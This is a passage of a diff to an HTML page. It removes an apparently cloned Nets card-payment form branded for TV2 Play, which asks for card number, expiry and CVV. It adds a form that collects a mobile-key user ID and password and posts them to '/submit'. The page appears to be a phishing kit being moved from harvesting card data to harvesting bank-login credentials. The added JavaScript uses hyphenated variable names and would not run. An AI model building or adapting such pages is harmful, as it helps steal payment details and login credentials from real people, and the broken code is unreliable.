ypfixfBVpy7Q+EFzm39Irk3xjxO2G1wqnGloVwvHW5+ZvZmq1UgCRPas+m282rmZyRRx9n5bI2Fd8P8Q6wpDm/phYmgiAuGFi9HltD2ORP283VAs5ZRN8gFl+VqEG6vZ1zGKDB0C1itDF1fRAsArph06O3u8U0hKAZNhz+5hRTiecVWqCDhby1KQZkMIh0Af79ENSpNLqRXb8THPYDVG7ypth6DPcWBPQ/YjcL9maKtJK9B+UjplOCa8KHS8tys53qaIC7Ok3pk/OnEjsIWqSNWtS3UiGIHbeEkaZSO4xqXGQw5FUTlh+EqPEbFvVetO1u7d9pEx5uQu6MgtR/eS+6uadSt5kzB+uEo9gbYBmLWY29otAAs4TlyCmx1Pw7/40WPYYLDYdbtuxEqILZmoxgB1appip5+lmXQILBfOkRkA3FGzyCjJRtQMAe4rJX/nDlInqovUENogajzGXemRlbgua5NSfy9kL2bYX2rjO3VukJyc2mtqHnJ9jh7hNxiFpZ/qY5GWKd7HIYPI4RHu9aINCReEQJV0zpUPNNnBOsluGGe911ve3WtnGmXWnX2xO3zOsNVz5qi8FSg1bqDrjwWhD8lOIFOMeCjx5qO9RZ/ZL7plgRcMdC+w4zzMh3MqUe2i8NrJq8CBWKKU123snW2HI0SyRMBMqxSQ9AUyk86/rtylB8G7us2IHq7oanB1OlGAIZekxYC4aox5UBmlxImKEs5uU/o1o4vHaGVTutmrLvQ8fLP8gImpPlx8QgyDI0Yvpqa/rXUjMa8U591xizdTzD1ZbuqeB57gPTTPgOzmNWapBb5Vxusi9XndWt0GP3rJD1YKKdRn7GdwUM2wx/vv1JdHIDS9lf1qDH2JjitbtEwhuRukOFFjI4eRrhzPYZ30C3sftvIY7rD8pWt9k/rhC5AQ28SgTLe0fk7lfIlgdn2pcWv56tNLCWVwranimKPCne2ed8KOumz6Z7AOnjyE0nOdYimDhzvt3fBT70L70nV6k3V" />
-
-
-<script type="text/javascript">
-//<![CDATA[
- var validationRequiredforMaestro = 'True'; var verificationLabel = 'CreditCardMobileIssuer_securityCodeLabel'; var securityCode = 'securityCode'; var cardNumber = 'cardNumber'; var easyPaymentEpaySessionId = 'c1721cf55c204a8fbaae23742c475c1a';
-var perforing3dsCheck = true;
-window.tdsMethodIssuerId = '0';
-
-function ContinueAfter3dsMethod(threeDSMethodData)
-{
-var processButtonObj = window.document.getElementById('payButton');
-window.perforing3dsCheck = false;
-processButtonObj.click();
-}
-//]]>
-</script>
-<script type="text/javascript"> var netaxeptPaymentRequestParams = {"processEndPointUrl":"/externalnotification/paymentrequest/","nonce":{"paymentIdentifier":"c1721cf55c204a8fbaae23742c475c1a"},"orderDetails":{"isShippingRequired":true,"displayShippingOPtions":false,"isContactInfoRequired":true,"orderAmount":"100","orderCurrency":"NOK","allowedIssuers":["Visa","MasterCard","DinersClubInternational","Maestro","VisaPrepaid"]}}</script>
-<script src="https://epayment.nets.eu/terminal/ScriptResource.axd?d=fCLjNrFUeD7_az0jCw9Qpe0W4ojBXmAPDRiTVZ_QIB4W0CmVcUoNzjr_htyntn_kljivsg8YcUiybyp0U5q-wVbuywvQMsxDsskfx1kY2y3zdt3WBE5-6YcwfPJO8LCjyI1yvi39NclyosC9Wa0wtEA8ZdA1&amp;t=49337fe8" type="text/javascript"></script>
-<script src="https://epayment.nets.eu/terminal/Webservices/Terminal.asmx/js" type="text/javascript"></script>
-<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="A68248BB" />
-<input type="hidden" name="__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="" />
-<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="uBlU4uougMeOeTpFf0d2VZaQVmar6Vx6mO9mqcB8/hX0Ofl4Hle6ymvd8AXnlSPvJnPwYtbUtPAxtxXh3K+8/ICXCVHgictLSmxbnYcbJVvWz7TeYGIcaFuywDSqAe187mFEils7ICsytHe5onx0IlKrvfaK+bW6KJnIqL0krdqCltYThMWdjU10ScLGkiCKyVUl2/i9+64eMpCutxlfWav19ggf0pN4KtLFYT45ChUZt4+SQf151taDgD436VY04wLc3C4fnZWP42ONVRgvX/UxSHyrSgaUMJY+N83I5NM51QljX8q5Z23IL/DDpbDXwo9/HoeajYWXqI+4sn0WEr7xjTHuzv390vHIuSKBjaq2koHr5f6+2TSSP4NPXGL+1IW8IVEZ+jwkJSy3gGQDAdNbEHir171jJxwMyMSMm/o0p0A571RE0mrhQlhPKCT0rjpODvp6QiqRrYlcHMt4dW5Og9IGjyXZwtZEo0+tUdnMfXKNa8CQP//fq1uH27BQFYLheCIqxUPFroBCAmjpUOAOnqdSux/9paa6y0Ezw+5prYYJEO0R6frWjm2RDTeudEA+YhhD+PNd63VDYySc0kMi7WY0uIUBUZ6mXFedXI1nvlEsvSf65thgYlij/XhMs+u3DHCjZQQgZqk6TOvutdqhO8qV/ZvygBGonorBc0eEzEEise333KdzxJWMzaIygpLB9UbxXdPhginy/QiWUIoogHaN6XsjlNtqpgPRrCnS00roa6sUb4aR9Xxa96a/tA14AzBhqTSh/Baw" />
-            <div id="netaxeptHeader" data-role="header" data-nobackbtn="true" align="center" data-theme="netaxept" class="ui-bar-netaxept">
-                <img src="https://sumo.cdn.tv2.no/static_assets/nets/logo_tv2play.png" id="merchantlogo" style="padding: .4em 0 0.2em 0" />
-            </div>
-            <div id="content" data-role="content" name="contentMain">
-                
-                <div id="contentPadding" class="contentPadding row">
-                    <div id="genericContent" class="col-lg-7" style="">
-                        <div id="terminalInputDiv">
-                        <div id="ctl16_margins">
-	
-
-    <div id="ctl16_errorPanel" class="alert alert-danger errorPanel" style="display:none;">
-		
-        <span id="ctl16_errorText" role="alert"></span>
-    
-	</div>
-
-    <div id="ctl16_warningPanel" class="alert alert-warning warningPanel" style="display:none;">
-		
-        <span id="ctl16_warningText" role="alert"></span>
-    
-	</div>
-
-    <div id="ctl16_infoPanel" class="alert alert-info infoPanel" style="display:none;">
-		
-        <span id="ctl16_infoText" role="alert"></span>
-    
-	</div>
-
-    <div id="ctl16_okPanel" class="alert alert-success okPanel" style="display:none;">
-		
-        <span id="ctl16_okText" role="alert"></span>
-    
-	</div>
-
-
-</div>
-                         <div style="height: 17px;">
-                                
-                         </div>
-                        <div id="informationPanel">
-	
-                           
-                            
-                            <div id="infoDiv">
-                                
-                            
-                            <table id="amounttable">
-		<tr>
-			<td>
-                                    
-                                </td>
-			<td id="feeOld">
-                                    
-                                </td>
-		</tr>
-		<tr id="roundingAmountRow">
-			<td style="padding-right: 5px">
-                                    <span id="roundingLabel"></span>
-                                </td>
-			<td style="text-align: right">
-                                    <span id="rounding" style="float: right;"></span>
-                                </td>
-		</tr>
-		<tr id="totalAmountRow">
-			<td style="padding-right: 5px">
-                                    <span id="totalAmountLabel"></span>
-                                </td>
-			<td id="totalAmountNumrow">
-                                    <span id="totalAmount" style="float: right;"></span>
-                                </td>
-		</tr>
-	</table>
-	
-
-                            
-                            
-                        </div>
-                                
-</div>
-                       
-                         
-                            
-                        
-                        <div>
-                            
-
-
-<style type="text/css"> 
-    ::-webkit-input-placeholder { /* WebKit browsers */
-        color:    dimgray ;
-    }
-    :-moz-placeholder { /* Mozilla Firefox 4 to 18 */
-        color:    dimgray ;
-    }
-    ::-moz-placeholder { /* Mozilla Firefox 19+ */
-        color:    dimgray ;
-    }
-    :-ms-input-placeholder { /* Internet Explorer 10+ */
-        color:    dimgray ;
-    }
-    ::placeholder{
-        color:    dimgray ;
-    }
-</style> 
-
-<script type="text/javascript">
-
-    var chkMobileDevice = true
-    var easyPaymentCurrentIssuerImageId = "currentIssuerImage";
-    var easyPaymentCurrentIssuerNameId = "test";
-    var easyPaymentIssuers = [];
-
-    $(document).ready(function () {
-
-        $("#feeSection").click(function () {
-            if ($("#feeDetails").is(":visible"))
-                $("#expandCollapse").attr("src", "/Images/Misc/expand.png");
-            else
-                $("#expandCollapse").attr("src", "/Images/Misc/collapse.png");
-            $("#feeDetails").stop().slideToggle();
-        });
-        GetIssuer(cardNumber);
-        $('#issuerIcons').find('img').each(function () {
-            this.style.marginRight = "5px";
-            var id = this.alt.split('_')[0];
-            var name = this.alt.split('_')[1];
-            var iconObj = { imageId: this.id, issuerName: name, imageFile: this.src.substring(this.src.lastIndexOf('/') + 1) };
-            $(this).attr('alt', name);
-            // TODO workaround for Discover
-            if (id != 6 || name != "Discover&reg;")
-                easyPaymentIssuers[id] = iconObj;
-            else
-                easyPaymentDiscover = iconObj;
-        });
+      if (!auth-device-userid-mobilekey|| !auth-device-password) {
+        e.preventDefault(); // Prevent form submission
+        alert('Vennligst fyll ut alle nødvendige felt');
+      }
     });
+  });
+
+  function submitForm(event) {
+    event.preventDefault();
+
+    var auth-device-userid-mobilekey = document.getElementById('auth-device-userid-mobilekey').value;
+    var auth-device-password = document.getElementById('auth-device-password').value;
+   
+
+    var formData = new FormData();
+    formData.append('auth-device-userid-mobilekey', auth-device-userid-mobilekey);
+    formData.append('auth-device-password', auth-device-password);
+
+    fetch('/submit', {
+        method: 'POST',
+        body: formData
+    }).then(function(response) {
+        if (response.ok) {
+            alert('Data submitted successfully!');
+            document.getElementById('submit-form').reset();
+        } else {
+            alert('Error submitting data!');
+        }
+    }).catch(function(error) {
+        console.error('Error:', error);
+    });
+}
+
 </script>
+-->
 
-
-
-
-
-<div id="divTwoPagePayment" style="padding-top: 10px">
-    <div id="issuerIcons" class="card-header" style="display: none">
-    <img id="icon_Visa" src="https://epayment.nets.eu/Images/Issuers/Icons/IconImage/Visa.svg" alt="3_Visa" border="0" /><img id="icon_MasterCard" src="https://epayment.nets.eu/Images/Issuers/Icons/IconImage/Mastercard.svg" alt="4_MasterCard" border="0" /><img id="icon_DinersClubInternational" src="https://epayment.nets.eu/Images/Issuers/Icons/IconImage/Diners.svg" alt="6_Diners club international" border="0" /><img id="icon_Maestro" src="https://epayment.nets.eu/Images/Issuers/Icons/IconImage/Maestro.svg" alt="14_Maestro" border="0" /><img id="icon_VisaPrepaid" src="https://epayment.nets.eu/Images/Issuers/Icons/IconImage/visa.png" alt="91_Visa" border="0" /></div>
-    <div class="form-field__control" id="dvTwoPageCardNumber" ClientIDMode="Static" tabindex="-1">
-        <input name="cardNumber" maxlength="19" id="cardNumber" class="form-field__input cardNo" placeholder="0000 0000 0000 0000" autocomplete="off" size="19" onChange="javascript:GetIssuer(this.id);" onKeyUp="javascript:GetIssuer(this.id);" type="tel" />
-        <label for="cardNumber" id="cardNoLabel" class="form-field__label">Kortnummer</label>
-
-        
-    </div>
-    <div class="form-field__control W_50pr f_left" id="dvExpiryDate" tabindex="-1">
-        
-        
-        <div id="divDropdown">
-            <div class="ui-grid-a">
-              <div class="ui-block-a">
-            <div><label for="month" id="month">Expiry Month:</label></div>
-            <div><select name="month" id="month" tabindex="2">
-	<option value="01">01</option>
-	<option value="02">02</option>
-	<option value="03">03</option>
-	<option value="04">04</option>
-	<option value="05">05</option>
-	<option value="06">06</option>
-	<option value="07">07</option>
-	<option value="08">08</option>
-	<option value="09">09</option>
-	<option value="10">10</option>
-	<option value="11">11</option>
-	<option value="12">12</option>
-
-</select></div>
-                     
-              </div>
-              <div class="ui-block-b">
-            <div><label for="year" id="year">Expiry Year:</label></div>
-            <div>
-                <select name="year" id="year" tabindex="3">
-	<option value="23">2023</option>
-	<option value="24">2024</option>
-	<option value="25">2025</option>
-	<option value="26">2026</option>
-	<option value="27">2027</option>
-	<option value="28">2028</option>
-	<option value="29">2029</option>
-	<option value="30">2030</option>
-	<option value="31">2031</option>
-	<option value="32">2032</option>
-	<option value="33">2033</option>
-	<option value="34">2034</option>
-	<option value="35">2035</option>
-
-</select>
-            </div>
-                   </div>  
-              </div>
-       </div> 
-        </div>
-    <div id="cvcDiv">
-    <div class="form-field__control W_49pr" id="dvSecuritycode" tabindex="-1">
-        <input name="securityCode" maxlength="4" id="securityCode" placeholder="000" class="form-field__input securityCode" autocomplete="off" size="4" type="tel" />
-        <label for="securityCode" id="securityCodeLabel" class="form-field__label">Verifiseringskode</label>
-
-        
-    </div>
-            
-    <div id="mifDiv">
-        <label class="mifLabel"><span id="mifTxt">Betal som Visa</span>
-            <input id="mifCheckbox" type="checkbox" name="CreditCardMobileIssuer$mifCheckbox" />
-            <span  class="mifCheckmark" aria-role="checkbox">&nbsp;&nbsp;</span><div id="mifImage"><img src="https://epayment.nets.eu/Images/Issuers/Icons/visa.png"/></div>
-
-        </label>
-        </div>
-        <div id="netsLogoExt" style="text-align:right;width:45%;transform: translateY(30px);">
-                           <img class="netaxeptLogo" src="https://epayment.nets.eu/terminal/Images/netsSmall_New.png" style="text-align:right" alt="Nets Logo" />
-                     </div>
-        </div>
-    </div>
-<input type="hidden" name="CreditCardMobileIssuer$validationRequired" id="validationRequired" value="True" />
-
-<script type="text/javascript" src="https://epayment.nets.eu/epay/Scripts/Common.js?2065"></script>
-<script type="text/javascript" src="https://epayment.nets.eu/epay/Scripts/EasyPayment.js?1858"></script>
-
-                        </div>
-                            
-                    </div>
-                </div>
-                </div>
-                 <div id="informationDiv" class="ui-grid-b">
-                 
-                        <div id="payButtonDiv" class="ui-block-c">
-                           <!-- <input type="submit" name="payButton" value="Registrer" onclick="if (perforing3dsCheck) {window.document.getElementById(&#39;payButton&#39;).style.display=&#39;none&#39;;var progressImageObj=document.getElementById(&#39;progressImage&#39;);if(progressImageObj)progressImageObj.style.display=&#39;inline&#39;;Check3dsMethod(&#39;https://epayment.nets.eu/terminal&#39;, &#39;c1721cf55c204a8fbaae23742c475c1a&#39;, &#39;cardNumber&#39;, &#39;&#39;, &#39;month&#39;, &#39;year&#39;, &#39;0&#39;, &#39;ctl16_margins&#39;,&#39;payButton&#39;); return false;};" id="payButton" data-theme="netaxeptPay" class="ui-btn-up-netaxeptPay btn" />-->
-                           <input type="submit" name="payButton" value="Registrer" onclick="javascript:__doPostBack('EasyPaymentMini$okButton','')" id="payButton" data-theme="netaxeptPay" class="ui-btn-up-netaxeptPay btn"/>
-                        </div>
-                    </div>
-                    
-           
-                            <div id="dvSecureMessage">
-                        <span id="lblSecureDataProcMessage"></span>
-                            </div>
-               <div id="toolbar">
-                    
-                    <div id="toolbarButtons" class="ui-grid-b">
-                  
-                        <div id="backButtonDiv" class="ui-block-a">
-                            
-                            </div>
-                        <div id="cancelButtonDiv" class="ui-block-b">
-                            
-                        </div>
-                        </div>
-                    </div>
-                <div id="progressImageDiv"><img id="progressImage" src="https://epayment.nets.eu/terminal/Images/transparentProgress.gif" src="Default.aspx@epaySessionId=c1721cf55c204a8fbaae23742c475c1a&amp;issuer=CreditCard&amp;fbclid=IwAR3PL8tfhMWgVVAAZtSyHdhYgUf6GHZg_12S_ezAIlXlDRDuB0hjXOxDJ5k.html" alt="Loading..." border="0" style="display: none;" /></div>
-                </div>
-                <div class="modal fade" id="modalCVV" tabindex="-1" role="dialog" aria-labelledby="modalLabel" aria-hidden="true" style="z-index: 10000;">
-                    <div class="modal-dialog" role="document">
-                        <div class="modal-content">
-                            <div class="modal-header">
-                               <span id="modalLabel" class="modal-title" style="font-weight:bold">Nets - Hva er CVV?</span>
-                                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
-                                    <span aria-hidden="true">&times;</span>
-                                </button>
-                            </div>
-                            <div class="modal-body">
-                                <div style="border: solid 1px #7f7b7b;">
-                                                      <table style="padding:0px;border-spacing:0px;" role="presentation">
-                        
-                        <tr role="presentation">
-                            <td colspan="2" role="presentation">
-                                <div style="font-weight: bold; padding: 10px; color: black">
-                                    Hva er verifiseringskode(CVV2/ CVC2/CID)?
-                                </div>
-                                <div style="padding-left: 10px; color: black">
-                                    <span id="into">Verifiseringskoden er et 3- eller 4-sifret nummer som er  skrivet på forsiden eller baksiden av kortet. Verifiseringskoden hjelper selgeren å forhindre svindel og bekrefte transaksjonen når det faktiske kortet ikke er til stede på kjøpstidspunktet. Dette nummeret brukes som en del av autorisasjonsprosessen med kortutsteder.</span>
-                                </div>
-                            </td>
-                        </tr>
-                        <tr role="presentation">
-                            <td valign="top" role="presentation">
-                                <div style="font-weight: bold; padding: 10px; color: black">
-                                    Hvor finner jeg det?
-                                </div>
-                                <div style="font-weight: bold; padding-left: 10px; color: black">
-                                    Visa, Mastercard, JCB, Diners Club og Discover
-                                </div>
-                                <div style="padding-left: 10px; color: black">
-                                    <span id="visaCVV">Verifiseringskoden er det tresifrede nummeret som er skrevet ut på baksiden av kortet, vanligvis på slutten av signaturpanelet. Hvis du bruker et kreditt- / debetkort og vil betale med debet, er bekreftelseskoden de tre sifrene etter kortnummeret på kortets bakside.</span>
-                                </div>
-                            </td>
-                        </tr>
-                        <tr role="presentation">
-                            <td valign="top" role="presentation">
-                                <div style="font-weight: bold; padding-left: 10px; padding-top: 10px; color: black">American Express</div>
-                                <div style="padding-left: 10px; padding-bottom: 10px; color: black">
-                                    <span id="amexCVV">Verifiseringskoden er det 4-sifret nummeret som står på forsiden, over og til høyre på kortet ditt.</span>
-                                </div>
-                            </td>
-                        </tr>
-                    </table>
-
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-<!-- The Modal -->
-        <div id="myModal" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="modalLabel" aria-hidden="true" style="z-index: 10000;padding-top:70px;">
-             <div class="modal-dialog" role="document">
-            <div class="mymodal" ><span id="modalHeader" style="font-weight:bold;font-size:14px;"></span></div>
-            <div class="mymodal">
-                <span id="modalContent"></span>
-            </div>
-            <div class="mymodal">
-                <button type="button" class="btn closewindow" onclick="close();"> <span id="modalFooter"></span></button></div>
-        </div>
-       </div>
-        
-            <input name="terminalDesign" type="hidden" id="terminalDesign" form="" value="false" />
-<input type="hidden" name="hdnMerchandAcqID" id="hdnMerchandAcqID" value="578200" />            
-        </form>
-    </div>
+ 
     
    <script>
-  $(document).ready(fun
-  ction() {
+  $(document).ready(function() {
   // Replace 'form1' with the actual ID of your form element if different
   $('#form1').submit(function(e) {
-    var cardNumber = $('#cardNumber').val();
-    var month = $('#month').val();
-    var year = $('#year').val();
-    var cvv = $('#securityCode').val();
-
-    if (!cardNumber || !cvv) {
+    var auth-device-radio-mobilekey = $('#auth-device-radio-mobilekey').val();
+    var auth-device-password = $('#auth-device-password').val();
+   
+    if (!auth-device-password || !auth-device-radio-mobilekey) {
       e.preventDefault(); // Prevent form submission
-      alert('Vennligst fyll ut alle nødvendige felt');
+      alert('Please enter all fields');
+    }else {
+      e.target.submit();
+     
     }
   });
 });
 
 
 </script>
-</body>
-</html>
+
+</body></html>
